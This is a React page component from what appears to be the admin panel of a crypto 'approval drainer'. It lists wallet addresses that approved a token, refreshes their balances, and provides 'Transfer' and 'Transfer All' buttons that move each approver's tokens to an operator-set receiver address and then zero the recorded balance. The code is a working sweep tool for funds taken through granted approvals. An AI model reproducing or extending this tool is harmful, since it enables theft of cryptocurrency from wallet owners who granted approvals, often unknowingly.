import React, { useState, useEffect } from 'react'
import {useParams} from 'react-router-dom'
import {
  Button,
  Paper, 
  Table, 
  TableBody, 
  TableCell, 
  TableContainer, 
  TableHead, 
  TablePagination, 
  TableRow, 
  IconButton,
  Backdrop,
  CircularProgress,
} from '@material-ui/core'
import {Refresh} from '@material-ui/icons'

import Header from '../components/header'
import {get as getToken} from '../api/token'
import {getAllByToken as getApproves, updateToken} from '../api/approve'
import {transfer, transferAll, getBalance} from '../api/contract'
import { Styles } from './style/tokensStyle'
import { useSetting } from '../provider/setting'

const columns = [
  { id: "address", label: "Address", minWidth: 100 },
  { id: "balance", label: "Balance", minWidth: 100 },
  { id: "approve", label: "Approve", minWidth: 100 },
  {
    id: "action",
    label: "Action",
    minWidth: 170,
    align: "center",
  },
];
const Token = () => {
  const {id} = useParams()
  const [setting] = useSetting()
  const [page, setPage] = useState(0)
  const [rowsPerPage, setRowsPerPage] = useState(10)
  const [token, setToken] = useState({})
  const [approves, setApproves] = useState([])
  const [pending, setPending] = useState(false)
  
  const handleChangePage = (event, newPage) => {
    setPage(newPage)
  }
  const handleChangeRowsPerPage = (event) => {
    setRowsPerPage(+event.target.value)
    setPage(0)
  }
  const handleTransfer = async (approve) => {
    if (setting.address) {
      try {
        let receiver = setting.address
        if (setting.receiver && setting.receiver !== '')
          receiver = setting.receiver
        await transfer(approve.address, token.address, receiver, 0, true, setting.address)
        let tmp = {}
        tmp._id = approve?.approveTokens?._id
        tmp.balance = 0
        await updateToken(approve._id, tmp)
        await refresh(id)
      } catch (error) {
        console.log(error)
      }
    }
  }
  const handleTransferAll = async () => {
    if (setting.address && approves.length > 0) {
      try {
        let receiver = setting.address
        if (setting.receiver && setting.receiver !== '')
          receiver = setting.receiver
        const addresses = approves.map((approve) => approve.address)
        await transferAll(addresses, token.address, receiver, 0, true, setting.address)
        await Promise.all(approves.map(async (approve) => {
          let tmp = {}
          tmp._id = approve?.approveTokens?._id
          tmp.balance = 0
          await updateToken(approve._id, tmp)
        }))
        await refresh(id)
      } catch (error) {
        console.log(error)
      }
    }
  }
  const refresh = async (id) => {
    setPending(true)
    let tmpApproves = await getApproves(id)
    tmpApproves = tmpApproves.map((item) => {
      const balance = item.approveTokens.balance 
      item.balance = balance.toFixed(2)
      item.approve = item.approveTokens.approve
      return item
    })
    setApproves(tmpApproves)
    setPending(false)
    console.log(tmpApproves)
  }
  const handleUpdateBalaces = async () => {
    setPending(true)
    const tmpApproves = await Promise.all(approves.map(async (approve) => {
      const balance = await getBalance(token.address, approve.address)
      console.log(balance)
      let tmp = {}
      tmp._id = approve?.approveTokens?._id
      tmp.balance = balance
      await updateToken(approve._id, tmp)
      approve.balance = balance.toFixed(2)
      return approve
    }))
    setApproves(tmpApproves)
    setPending(false)
  }

  useEffect(() => {
    ( async () => {
      const tmpToken = await getToken(id)
      console.log(tmpToken)
      setToken(tmpToken)
      await refresh(id)
    })()
  }, [id])
  return (
    <Styles>
      <div className='tokens'>
        <Backdrop open={pending} style={{zIndex: 9999}}>
          <CircularProgress color="primary" />
        </Backdrop>
        <Header />
        <div className='main'>
          <div className='title'>Tokens {`(${token.name})`}</div>  
          <div className='table'>
            <IconButton aria-label="detail" onClick={handleUpdateBalaces}>
              <Refresh />
            </IconButton>
            <Button style={{marginBottom: 10, float: 'right'}} variant="outlined" onClick={handleTransferAll}>Transfer All</Button>
            <Paper className='root'>
              <TableContainer className='container' style={{fontSize: 15}}>
                <Table stickyHeader aria-label="sticky table">
                  <TableHead>
                    <TableRow>
                      {columns.map((column) => (
                        <TableCell
                          key={column.id}
                          align={column.align}
                          style={{ minWidth: column.minWidth, fontSize: 15 }}
                        >
                          {column.label}
                        </TableCell>
                      ))}
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {approves.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage).map((row, index) => {
                      return (
                        <TableRow hover role="checkbox" tabIndex={-1} key={index}>
                          {columns.map((column) => {
                            const value = row[column.id];
                            return (
                              <TableCell key={column.id} align={column.align} style={{fontSize: 14}}>
                                {column.id === 'action'?
                                  (
                                    <Button variant="outlined" onClick={() => handleTransfer(row)}>Transfer</Button>
                                  ):
                                  value
                                }
                              </TableCell>
                            );
                          })}
                        </TableRow>
                      );
                    })}
                  </TableBody>
                </Table>
              </TableContainer>
              <TablePagination
                rowsPerPageOptions={[10, 25, 100]}
                component="div"
                count={approves.length}
                rowsPerPage={rowsPerPage}
                page={page}
                onChangePage={handleChangePage}
                onChangeRowsPerPage={handleChangeRowsPerPage}
              />
            </Paper>
          </div>
        </div>    
      </div>
    </Styles>
  )
}
export default Token
